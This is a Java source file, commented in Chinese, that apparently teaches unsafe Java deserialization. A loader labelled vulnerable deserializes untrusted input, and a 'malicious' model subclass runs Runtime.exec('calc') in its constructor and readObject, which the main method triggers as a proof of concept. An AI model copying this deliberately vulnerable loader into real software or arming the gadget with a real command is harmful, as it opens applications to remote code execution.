import java.io.*;
import java.util.*;

// 数学模型接口
interface MathModel extends Serializable {
    double evaluate(double x);
}

// 多项式模型实现
class PolynomialModel implements MathModel {
    private double[] coefficients;
    
    public PolynomialModel(double[] coeffs) {
        this.coefficients = Arrays.copyOf(coeffs, coeffs.length);
    }
    
    @Override
    public double evaluate(double x) {
        double result = 0;
        for (int i = 0; i < coefficients.length; i++) {
            result += coefficients[i] * Math.pow(x, i);
        }
        return result;
    }
}

// 漏洞点：不安全的模型加载器
class VulnerableModelLoader {
    public static MathModel loadModel(InputStream inputStream) throws Exception {
        try (ObjectInputStream ois = new ObjectInputStream(inputStream)) {
            // 直接反序列化不可信数据，存在漏洞
            Object obj = ois.readObject();
            if (obj instanceof MathModel) {
                return (MathModel) obj;
            }
            throw new InvalidObjectException("Invalid model type");
        }
    }
}

// 模拟攻击者构造的恶意类
class MaliciousModel extends PolynomialModel {
    public MaliciousModel() {
        super(new double[]{0});
        // 恶意代码执行
        try {
            Runtime.getRuntime().exec("calc");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
        in.defaultReadObject();
        // 在反序列化时触发恶意代码
        Runtime.getRuntime().exec("calc");
    }
}

// 主程序
class SimulationRunner {
    public static void main(String[] args) throws Exception {
        // 正常使用示例
        MathModel model = new PolynomialModel(new double[]{1, 2, 3});
        System.out.println("Normal model result: " + model.evaluate(2));
        
        // 漏洞演示：构造恶意输入流
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        try (ObjectOutputStream oos = new ObjectOutputStream(baos)) {
            oos.writeObject(new MaliciousModel());
        }
        
        // 模拟加载恶意模型（触发漏洞）
        InputStream evilStream = new ByteArrayInputStream(baos.toByteArray());
        MathModel evilModel = VulnerableModelLoader.loadModel(evilStream);
        System.out.println("Evil model result: " + evilModel.evaluate(0));
    }
}